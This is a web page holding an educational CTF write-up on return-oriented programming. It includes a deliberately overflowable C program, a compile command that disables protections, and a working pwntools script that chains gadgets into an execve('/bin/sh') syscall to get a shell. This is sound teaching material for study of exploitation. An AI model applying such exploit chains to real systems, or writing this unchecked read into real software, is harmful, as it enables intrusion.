<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  Simple PWN - 0x07(ROP)
  #


  tags: CTF PWN eductf
  #


  Background
  #


This is very similar to normal BOF.
If a sample code that doesn&rsquo;t have a backdoor function and you cannot input a backdoor function as well, then you can use some code segment to merge a shellcode.
Therefore, the main idea is use some <operation>;ret pattern segment to overlap stack.



  Original Code
  #

#include <stdio.h>
#include <unistd.h>

int main()
{
    setvbuf(stdin, 0, _IONBF, 0)
    setvbuf(stdout, 0, _IONBF, 0);

    char s[0x10];

    printf("Here is your \"/bin/sh\": %p\n", "/bin/sh");
    printf("Give me your ROP: ");
    read(0, s, 0x400);
    
    return 0;
}

At line 11, %p means pointer of /bin/sh string.
Note that, if you establish the code yourself, you must turn off the protection by the command below and use checksec to observe the protection. In addition, please use -static command to compile library at compile time, so that we can get ROP gadget more easily.
gcc -o rop rop.c -zexecstack -no-pie -fno-stack-protector -z norelro -static



  Exploit
  #


First, we can observe the program has overflow(very important), but has no other backdoor method can access or global variable can write shellcode. Then we can consider to use ROP gadget to construct chain.
Second, we use ROPgadget to find suitable gadget
$ ROPgadget --multibr --binary rop > rop_gadget
$ vim rop_gadget






Note that, you may consider that pop rdx ; pop rbx ; ret is not what we want. We just want pop rdx ; ret. Therefore, we have to push one more value for pop rbx ; instruction.


Then, we can construct our payload:
from pwn import *

context.arch = &#39;amd64&#39;

r = process(&#39;./rop&#39;)

r.recvuntil(&#39;Here is your "/bin/sh": &#39;)
binsh = int(r.recvline()[:-1], 16)
info(f"binsh: {hex(binsh)}")

pop_rdi_ret = 0x401eaf
pop_rsi_ret = 0x409ede
pop_rdx_ret = 0x485aeb
pop_rax_ret = 0x44fcc7
syscall = 0x401c64

Note that, r.recvline()[:-1] is b&#39;0x498004&#39; and we must pop to %rdi at line 17 below.


Then we can combine them together using flat method. It&rsquo;ll flat the address with length 8 bytes.
ROP = flat(
    pop_rdi_ret, binsh,
    pop_rsi_ret, 0,
    pop_rdx_ret, 0, 0,
    pop_rax_ret, 0x3b,
    syscall,
)

gdb.attach(r)
r.sendafter("Give me your ROP: ", b&#39;a&#39; * 0x18 + ROP)

r.interactive()

Finally, we got shell!!!



  Analysis
  #


This is totally the same as our hypothesis.

We can see that all parameters are ready



  Reference
  #

NTUSTISC - Pwn Basic 3 [2019.03.26]
Pwn week1'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x07rop/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple PWN - 0x07(ROP)"><meta property="og:description" content='Simple PWN - 0x07(ROP) # tags: CTF PWN eductf # Background # This is very similar to normal BOF. If a sample code that doesn’t have a backdoor function and you cannot input a backdoor function as well, then you can use some code segment to merge a shellcode. Therefore, the main idea is use some <operation>;ret pattern segment to overlap stack. Original Code # #include <stdio.h> #include <unistd.h> int main() { setvbuf(stdin, 0, _IONBF, 0) setvbuf(stdout, 0, _IONBF, 0); char s[0x10]; printf("Here is your \"/bin/sh\": %p\n", "/bin/sh"); printf("Give me your ROP: "); read(0, s, 0x400); return 0; } At line 11, %p means pointer of /bin/sh string. Note that, if you establish the code yourself, you must turn off the protection by the command below and use checksec to observe the protection. In addition, please use -static command to compile library at compile time, so that we can get ROP gadget more easily. gcc -o rop rop.c -zexecstack -no-pie -fno-stack-protector -z norelro -static Exploit # First, we can observe the program has overflow(very important), but has no other backdoor method can access or global variable can write shellcode. Then we can consider to use ROP gadget to construct chain. Second, we use ROPgadget to find suitable gadget $ ROPgadget --multibr --binary rop > rop_gadget $ vim rop_gadget Note that, you may consider that pop rdx ; pop rbx ; ret is not what we want. We just want pop rdx ; ret. Therefore, we have to push one more value for pop rbx ; instruction. Then, we can construct our payload: from pwn import * context.arch = &#39;amd64&#39; r = process(&#39;./rop&#39;) r.recvuntil(&#39;Here is your "/bin/sh": &#39;) binsh = int(r.recvline()[:-1], 16) info(f"binsh: {hex(binsh)}") pop_rdi_ret = 0x401eaf pop_rsi_ret = 0x409ede pop_rdx_ret = 0x485aeb pop_rax_ret = 0x44fcc7 syscall = 0x401c64 Note that, r.recvline()[:-1] is b&#39;0x498004&#39; and we must pop to %rdi at line 17 below. Then we can combine them together using flat method. It’ll flat the address with length 8 bytes. ROP = flat( pop_rdi_ret, binsh, pop_rsi_ret, 0, pop_rdx_ret, 0, 0, pop_rax_ret, 0x3b, syscall, ) gdb.attach(r) r.sendafter("Give me your ROP: ", b&#39;a&#39; * 0x18 + ROP) r.interactive() Finally, we got shell!!! Analysis # This is totally the same as our hypothesis. We can see that all parameters are ready Reference # NTUSTISC - Pwn Basic 3 [2019.03.26] Pwn week1'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><meta property="article:tag" content="Eductf"><title>Simple PWN - 0x07(ROP) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x07rop/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple PWN - 0x07(ROP)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#background>Background</a></li><li><a href=#original-code>Original Code</a></li><li><a href=#exploit>Exploit</a></li><li><a href=#analysis>Analysis</a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-pwn---0x07rop>Simple PWN - 0x07(ROP)
<a class=anchor href=#simple-pwn---0x07rop>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><ul><li>This is very similar to normal <code>BOF</code>.</li><li>If a sample code that doesn&rsquo;t have a backdoor function and you cannot input a backdoor function as well, then you can use some code segment to merge a shellcode.</li><li>Therefore, the main idea is use some <code>&lt;operation>;ret</code> pattern segment to overlap stack.
<img src=https://imgur.com/YGarADK.png alt></li></ul><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><pre tabindex=0><code class="language-c!=1" data-lang="c!=1">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int main()
{
    setvbuf(stdin, 0, _IONBF, 0)
    setvbuf(stdout, 0, _IONBF, 0);

    char s[0x10];

    printf(&#34;Here is your \&#34;/bin/sh\&#34;: %p\n&#34;, &#34;/bin/sh&#34;);
    printf(&#34;Give me your ROP: &#34;);
    read(0, s, 0x400);
    
    return 0;
}
</code></pre><ul><li>At line <code>11</code>, <code>%p</code> means pointer of <code>/bin/sh</code> string.</li><li>Note that, if you establish the code yourself, you must turn off the protection by the command below and use <code>checksec</code> to observe the protection. In addition, please use <code>-static</code> command to compile library at compile time, so that we can get <code>ROP gadget</code> more easily.<pre tabindex=0><code class=language-bash! data-lang=bash!>gcc -o rop rop.c -zexecstack -no-pie -fno-stack-protector -z norelro -static
</code></pre></li></ul><h2 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h2><ul><li>First, we can observe the program has overflow(very important), but has no other backdoor method can access or global variable can write shellcode. Then we can consider to use <code>ROP gadget</code> to construct chain.</li><li>Second, we use <code>ROPgadget</code> to find suitable gadget<pre tabindex=0><code class=language-bash! data-lang=bash!>$ ROPgadget --multibr --binary rop &gt; rop_gadget
$ vim rop_gadget
</code></pre><img src=https://imgur.com/IzeTvgK.png alt>
<img src=https://imgur.com/PlA5C8B.png alt>
<img src=https://imgur.com/zg28Pti.png alt>
<img src=https://imgur.com/WDS0HUh.png alt>
<img src=https://imgur.com/dEh7b5n.png alt="reference link"><ul><li>Note that, you may consider that <code>pop rdx ; pop rbx ; ret</code> is not what we want. We just want <code>pop rdx ; ret</code>. Therefore, we have to push one more value for <code>pop rbx ;</code> instruction.</li></ul></li><li>Then, we can construct our payload:<pre tabindex=0><code class="language-python!=" data-lang="python!=">from pwn import *

context.arch = &#39;amd64&#39;

r = process(&#39;./rop&#39;)

r.recvuntil(&#39;Here is your &#34;/bin/sh&#34;: &#39;)
binsh = int(r.recvline()[:-1], 16)
info(f&#34;binsh: {hex(binsh)}&#34;)

pop_rdi_ret = 0x401eaf
pop_rsi_ret = 0x409ede
pop_rdx_ret = 0x485aeb
pop_rax_ret = 0x44fcc7
syscall = 0x401c64
</code></pre><ul><li>Note that, <code>r.recvline()[:-1]</code> is <code>b'0x498004'</code> and we must pop to <code>%rdi</code> at line <code>17</code> below.</li></ul></li><li>Then we can combine them together using <a href=https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.flat>flat method</a>. It&rsquo;ll flat the address with <strong>length 8 bytes</strong>.<pre tabindex=0><code class="language-python!=16" data-lang="python!=16">ROP = flat(
    pop_rdi_ret, binsh,
    pop_rsi_ret, 0,
    pop_rdx_ret, 0, 0,
    pop_rax_ret, 0x3b,
    syscall,
)

gdb.attach(r)
r.sendafter(&#34;Give me your ROP: &#34;, b&#39;a&#39; * 0x18 + ROP)

r.interactive()
</code></pre></li><li>Finally, we got shell!!!
<img src=https://imgur.com/dk0Z2mw.png alt></li></ul><h2 id=analysis>Analysis
<a class=anchor href=#analysis>#</a></h2><ul><li>This is totally the same as our hypothesis.
<img src=https://imgur.com/OjcDNbu.png alt></li><li>We can see that all parameters are ready
<img src=https://imgur.com/xXx7HRQ.png alt></li></ul><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><p><a href="https://youtu.be/iA4Hrr17ooI?t=1239">NTUSTISC - Pwn Basic 3 [2019.03.26]</a>
<a href="https://youtu.be/ktoVQB99Gj4?t=6712">Pwn week1</a></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#background>Background</a></li><li><a href=#original-code>Original Code</a></li><li><a href=#exploit>Exploit</a></li><li><a href=#analysis>Analysis</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>